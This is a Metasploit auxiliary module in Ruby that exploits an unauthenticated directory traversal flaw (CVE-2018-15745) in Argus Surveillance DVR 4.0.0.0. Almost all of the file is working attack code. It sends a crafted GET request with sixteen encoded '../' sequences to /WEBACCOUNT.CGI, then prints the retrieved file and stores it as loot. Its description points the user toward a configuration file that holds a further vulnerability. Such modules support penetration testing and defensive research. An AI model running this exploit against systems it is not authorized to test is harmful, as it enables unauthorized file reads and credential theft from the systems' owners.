##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Argus Surveillance DVR 4.0.0.0 - Directory Traversal',
        'Description' => %q{
          This module leverages an unauthenticated arbitrary file read for
          the Argus Surveillance 4.0.0.0 system which never saw an update since.
          As this is a Windows related application we recommend looking for common
          Windows file locations, especially C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini
          which houses another vulnerability in the Argus Surveillance system. This directory traversal vuln
          is being tracked as CVE-2018-15745
        },
        'Author' => [
          'Maxwell Francis', # msf module
          'John Page' # (aka hyp3rlinx) PoC
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        },
        'DefaultOptions' => {
          'SSL' => false,
          'RPORT' => 8080
        },
        'References' => [
          # Vendor Download
          [ 'URL', 'https://argus-surveillance-dvr.soft112.com/#google_vignette'],
          # Exploit DB Listing
          [ 'EDB', '45296'],
          # CVE Number
          ['CVE', '2018-15745']
        ]
      )
    )

    register_options(
      [
        OptString.new('TARGET_FILE', [true, 'The file to retrieve', 'Windows/system.ini'])
      ]
    )
  end

  def run
    traversal_path = '..%2F' * 16
    target_file = datastore['TARGET_FILE'].gsub(' ', '%20')
    url_path = "/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=#{traversal_path}#{target_file}&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="

    print_status("Sending request to #{rhost}:#{rport} for file: #{target_file}")

    response = send_request_cgi({
      'method' => 'GET',
      'uri' => url_path
    })

    if response&.code == 200 && !response.body.include?('Cannot find this file.')
      print_good('File retrieved successfully!')
      print_line(response.body)
      store_loot('file_traversal', 'text/plain', rhost, response.body, "#{target_file.gsub('/', '_')}.txt")
    elsif response
      print_error('Failed to retrieve file.') # Response from server but file not returned
    else
      print_error('No response from target.') # No response from server
    end
  end
end
